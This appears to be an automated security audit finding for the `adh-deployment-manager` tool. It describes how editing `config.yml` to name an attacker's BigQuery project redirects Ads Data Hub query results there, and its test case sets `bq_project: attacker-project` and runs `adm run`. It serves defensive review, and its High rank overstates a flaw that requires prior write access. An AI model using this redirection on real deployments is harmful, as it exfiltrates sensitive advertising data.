- Vulnerability Name: Configuration Manipulation for Data Exfiltration
- Description:
    1. An attacker gains unauthorized write access to the `config.yml` file. This could be achieved through various methods such as exploiting system vulnerabilities, social engineering, or insider access.
    2. The attacker modifies the `config.yml` file.
    3. Within the `config.yml`, the attacker changes the values of `bq_project` and `bq_dataset` to point to a BigQuery project and dataset under their control.
    4. The victim user executes the `adm` tool (e.g., using `adm run` or `adm deploy`) with the manipulated `config.yml` file.
    5. The `adh-deployment-manager` library reads the configuration from the modified `config.yml` file, including the attacker-controlled `bq_project` and `bq_dataset`.
    6. When the queries are executed, the results are written to the BigQuery project and dataset specified in the manipulated configuration, which is controlled by the attacker.
    7. The attacker can then access and exfiltrate the sensitive data from their BigQuery project.
- Impact:
    - Data Exfiltration: Sensitive data processed by ADH queries is written to an attacker-controlled BigQuery project, allowing the attacker to access and steal this data.
    - Unauthorized Access to Data: The attacker gains unauthorized access to potentially sensitive Ads Data Hub query results.
    - Compliance Violations: Exfiltration of user data can lead to serious violations of data privacy regulations and compliance standards.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None: The provided code does not implement any specific mitigations against configuration manipulation. The documentation mentions access setup and authentication to ADH API, but no input validation or access control for the `config.yml` file is present in the code.
- Missing Mitigations:
    - Input Validation and Sanitization: Implement validation in the `Config` class (`adh_deployment_manager/config.py`) to check if `bq_project` and `bq_dataset` values conform to expected formats (e.g., project ID and dataset ID patterns).
    - Project/Dataset Whitelisting: Ideally, the application should only allow writing to a predefined list of authorized BigQuery projects and datasets. This list could be hardcoded or configured in a more secure manner, separate from the user-editable `config.yml`.
    - Access Control for `config.yml`: Implement operating system level access controls to restrict write access to the `config.yml` file only to authorized users or processes. This is an operational security measure but crucial to prevent unauthorized modification.
    - Configuration Change Monitoring and Logging: Implement logging of any changes made to the `config.yml` file. Monitoring these logs for unexpected modifications can help detect and respond to potential attacks.
- Preconditions:
    - Attacker Write Access to `config.yml`: The attacker must have write permissions to the `config.yml` file on the system where `adh-deployment-manager` is deployed.
    - Execution of `adm` Tool: A legitimate user must execute the `adm` tool (or use the library programmatically) after the `config.yml` file has been maliciously modified.
- Source Code Analysis:
    1. **`adh_deployment_manager/config.py` - Config class:**
        - The `Config` class is responsible for parsing the `config.yml` file.
        - In the `__init__` method, the `bq_project` and `bq_dataset` attributes are directly populated from the configuration file using `self.config.get("bq_project")` and `self.config.get("bq_dataset")`.
        - **Vulnerable Code Snippet:**
          ```python
          class Config:
              def __init__(self, path, working_directory=None):
                  # ...
                  self.bq_project = self.config.get("bq_project")
                  self.bq_dataset = self.config.get("bq_dataset")
                  # ...
          ```
        - **No Input Validation:** There is no input validation or sanitization performed on the values retrieved for `bq_project` and `bq_dataset`. The code directly trusts the values provided in the `config.yml` file.
    2. **`adh_deployment_manager/commands/run.py` - Runner.execute method:**
        - The `Runner.execute` method uses the `bq_project` and `bq_dataset` attributes from the `Config` object to construct the destination table path for the BigQuery output.
        - **Vulnerable Code Snippet:**
          ```python
          class Runner(AbsCommand):
              # ...
              def execute(self, deploy=False, update=False, **kwargs):
                  # ...
                  if not self.config.bq_project or not self.config.bq_dataset:
                      # ...
                  # ...
                  job = analysis_query._run(
                      query_for_run.get("start_date"),
                      query_for_run.get("end_date"),
                      f"{self.config.bq_project}.{self.config.bq_dataset}.{table_name}", # VULNERABLE LINE
                      query_for_run.get("parameters"), **kwargs)
                  # ...
          ```
        - **Direct Use of Configuration Values:** The code directly embeds `self.config.bq_project` and `self.config.bq_dataset` into the BigQuery destination table path without any checks to ensure they are valid or safe. This allows an attacker to control where the query results are written by manipulating the `config.yml` file.

- Security Test Case:
    1. **Setup:**
        - Deploy `adh-deployment-manager` in a test environment where you can modify the `config.yml` file.
        - Have a legitimate Google Cloud Project and BigQuery dataset where the tool is intended to write data (let's call it `legitimate-project:legitimate-dataset`).
        - Create a separate Google Cloud Project and BigQuery dataset under your control to simulate the attacker's environment (let's call it `attacker-project:attacker-dataset`). Ensure you have credentials to access `attacker-project:attacker-dataset`.
        - Configure `adh-deployment-manager` to use `legitimate-project:legitimate-dataset` in the original `config.yml`.
    2. **Malicious Configuration Modification:**
        - As an attacker, gain access to the `config.yml` file in the deployed environment.
        - Modify the `config.yml` file by changing the `bq_project` and `bq_dataset` values to your attacker-controlled project and dataset:
          ```yaml
          # ... other configurations ...
          bq_project: attacker-project
          bq_dataset: attacker-dataset
          # ... other configurations ...
          ```
        - Save the modified `config.yml` file.
    3. **Execute `adm run` command:**
        - As a legitimate user (or trigger the tool through its intended workflow), execute the `adm run` command (or any command that triggers query execution and data writing) using the modified `config.yml`:
          ```bash
          adm -c path/to/modified/config.yml run
          ```
    4. **Verify Data Exfiltration:**
        - After the `adm run` command completes successfully, check the BigQuery dataset in your attacker-controlled project (`attacker-project:attacker-dataset`).
        - Verify that the output tables generated by `adh-deployment-manager` and the corresponding query results are present in `attacker-project:attacker-dataset`, instead of the intended `legitimate-project:legitimate-dataset`.
    5. **Confirmation of Vulnerability:**
        - If the output tables and data are found in `attacker-project:attacker-dataset`, it confirms that the configuration manipulation vulnerability is exploitable, and an attacker can successfully redirect data output to their controlled environment.